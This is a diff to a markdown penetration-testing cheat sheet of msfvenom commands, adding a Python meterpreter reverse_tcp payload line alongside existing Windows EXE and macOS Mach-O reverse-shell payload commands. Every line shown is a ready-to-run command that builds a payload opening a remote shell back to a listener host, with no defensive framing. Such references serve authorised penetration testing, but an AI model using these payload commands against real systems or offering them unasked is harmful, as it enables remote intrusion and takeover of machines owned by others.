@@ -29,6 +29,10 @@ Name | Desc
 `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe > shell.exe` | EXE / Windows
 `msfvenom -p osx/x86/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f macho > shell.macho` | macho / Mac / OSX
 
+### Prog-Langs
+Name | Desc
+--- | ---
+`./msfvenom -p python/meterpreter/reverse_tcp lhost=192.168.1.1 -f raw -o test.py` | Python payload
 
 ### Web
 Name | Desc
